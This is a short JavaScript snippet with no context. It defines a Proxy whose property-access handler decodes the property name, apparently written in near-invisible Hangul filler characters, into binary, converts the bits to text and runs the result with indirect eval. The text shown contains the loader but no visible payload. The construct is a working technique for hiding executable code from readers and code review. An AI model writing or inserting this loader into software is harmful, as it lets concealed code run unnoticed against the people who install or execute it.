new Proxy({}, { 
  get: function(_, key) { 
    const decodedCode = [...key]
      .map(char => +('ﾠ' > char))
      .join('')
      .replace(/.{8}/g, byte => String.fromCharCode(parseInt(byte, 2)));
    (0, eval)(decodedCode);
    return true;
  } 
}).
